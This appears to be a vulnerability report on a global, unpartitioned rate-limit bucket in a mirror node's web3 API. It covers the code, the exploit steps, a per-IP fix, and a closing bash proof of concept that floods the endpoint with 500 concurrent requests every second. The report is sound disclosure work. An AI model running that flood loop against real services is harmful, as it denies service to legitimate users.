### Title
Global Token Bucket Allows Single Client to Monopolize Entire Rate Budget (No Per-Client Isolation)

### Summary
The `rateLimitBucket` bean in `ThrottleConfiguration.java` is a single, globally-shared Bucket4j bucket with no per-client or per-IP partitioning. Because `refillGreedy` allows the full capacity to be consumed in a single burst, any unprivileged client can drain all `requestsPerSecond` tokens in rapid succession, causing every other concurrent client to receive throttle errors for the remainder of that refill window. This is repeatable every second, indefinitely.

### Finding Description
**Exact code location:**
- `web3/src/main/java/org/hiero/mirror/web3/config/ThrottleConfiguration.java`, `rateLimitBucket()`, lines 25–32
- `web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java`, `throttle()`, line 38

**Root cause:**

```java
// ThrottleConfiguration.java lines 25-32
@Bean(name = RATE_LIMIT_BUCKET)
Bucket rateLimitBucket() {
    long rateLimit = throttleProperties.getRequestsPerSecond(); // default: 500
    final var limit = Bandwidth.builder()
            .capacity(rateLimit)
            .refillGreedy(rateLimit, Duration.ofSeconds(1))  // full burst allowed
            .build();
    return Bucket.builder().addLimit(limit).build(); // ONE global bucket, no per-client key
}
```

The bucket is a single Spring singleton bean. `refillGreedy(rateLimit, Duration.ofSeconds(1))` means the bucket starts full and all `rateLimit` tokens are available for immediate consumption by any single caller.

**Consumption point:**

```java
// ThrottleManagerImpl.java line 38
if (!rateLimitBucket.tryConsume(1)) {
    throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
}
```

There is no IP address, session, or client identity check before consuming from the shared bucket. All clients compete against the same global counter.

**Exploit flow:**

1. Attacker opens a connection (no authentication required).
2. Attacker fires 500 concurrent or rapid-sequential HTTP requests to any throttled endpoint (e.g., `/api/v1/contracts/call`).
3. All 500 tokens are consumed from the global bucket within milliseconds.
4. Every other legitimate client's request hits `tryConsume(1) == false` and receives a `ThrottleException` / HTTP 429 for up to ~1 second.
5. After the 1-second refill window, the attacker repeats — sustaining the denial indefinitely.

**Why existing checks are insufficient:**

- The `gasLimitBucket` is a separate concern (gas, not RPS) and does not protect the RPS budget.
- The `request[]` filter rules (`LOG`, `REJECT`, `THROTTLE`) are content-based and optional; they are not applied before the global RPS check and do not introduce per-client isolation.
- There is no IP-based allowlist, connection-level rate limiting, or per-client sub-bucket anywhere in the throttle stack.

### Impact Explanation
Any legitimate user of the web3 JSON-RPC endpoint can be denied service for sustained periods. The attacker pays only the cost of sending cheap HTTP requests (no gas, no fees). The service appears to be a public-facing mirror node API, so the affected population is all concurrent users. Severity is **Medium** (griefing / availability degradation, no fund loss, no state corruption), consistent with the scope classification in the question.

### Likelihood Explanation
Exploitation requires zero privileges — only the ability to send HTTP requests to the public endpoint. A trivial shell script or any HTTP benchmarking tool (`wrk`, `ab`, `hey`) is sufficient. The attack is repeatable every second with no cooldown penalty for the attacker. Detection is possible via access logs but mitigation requires operator intervention (e.g., firewall block), not automatic recovery.

### Recommendation
Replace the single global bucket with a **per-client (per-IP) rate limiter**. Bucket4j supports this natively via `ProxyManager` backed by a local or distributed cache:

```java
// Pseudocode
ProxyManager<String> proxyManager = Bucket4jCaffeine.builderFor(cache).build();

// Per request, resolve client IP and get/create a per-IP bucket:
String clientIp = request.getRemoteAddr();
Bucket clientBucket = proxyManager.builder()
    .addLimit(Bandwidth.builder()
        .capacity(perClientLimit)
        .refillGreedy(perClientLimit, Duration.ofSeconds(1))
        .build())
    .build(clientIp);

if (!clientBucket.tryConsume(1)) { throw new ThrottleException(...); }
```

Additionally, keep the global bucket as a secondary guard to cap total server load. This two-layer approach (per-client + global) prevents both single-client monopolization and aggregate overload.

### Proof of Concept

```bash
# Drain the global rate bucket (default 500 req/s) in one burst
# Run from a single machine — no special privileges needed

for i in $(seq 1 500); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST http://<mirror-node-host>/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d '{"data":"0x","to":"0x0000000000000000000000000000000000000001","gas":21000}' &
done
wait

# Immediately after, a legitimate user's request will receive HTTP 429:
curl -v -X POST http://<mirror-node-host>/api/v1/contracts/call \
  -H 'Content-Type: application/json' \
  -d '{"data":"0x","to":"0x0000000000000000000000000000000000000001","gas":21000}'
# Expected: HTTP 429 "Requests per second rate limit exceeded"

# Repeat every ~1 second to sustain the denial
```